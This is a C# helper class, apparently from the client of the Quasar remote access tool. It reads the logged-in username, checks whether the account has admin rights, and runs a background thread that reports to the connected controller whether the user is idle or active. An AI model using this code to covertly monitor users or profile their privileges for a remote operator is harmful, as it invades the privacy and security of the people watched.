using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Enums;

namespace xClient.Core.Helper;

public static class WindowsAccountHelper
{
	public static UserStatus LastUserStatus { get; set; }

	public static string GetName()
	{
		return Environment.UserName;
	}

	public static string GetAccountType()
	{
		using (WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent())
		{
			if (windowsIdentity != null)
			{
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(windowsIdentity);
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
				{
					return "Admin";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
				{
					return "User";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
				{
					return "Guest";
				}
			}
		}
		return "Unknown";
	}

	public static void StartUserIdleCheckThread()
	{
		Thread thread = new Thread(UserIdleThread);
		thread.IsBackground = true;
		thread.Start();
	}

	private static void UserIdleThread()
	{
		while (!QuasarClient.Exiting)
		{
			Thread.Sleep(5000);
			if (IsUserIdle())
			{
				if (LastUserStatus != 0)
				{
					LastUserStatus = UserStatus.Idle;
					new SetUserStatus(LastUserStatus).Execute(Program.ConnectClient);
				}
			}
			else if (LastUserStatus != UserStatus.Active)
			{
				LastUserStatus = UserStatus.Active;
				new SetUserStatus(LastUserStatus).Execute(Program.ConnectClient);
			}
		}
	}

	private static bool IsUserIdle()
	{
		long num = Stopwatch.GetTimestamp() - NativeMethodsHelper.GetLastInputInfoTickCount();
		num = ((num > 0) ? (num / 1000) : 0);
		return num > 600;
	}
}
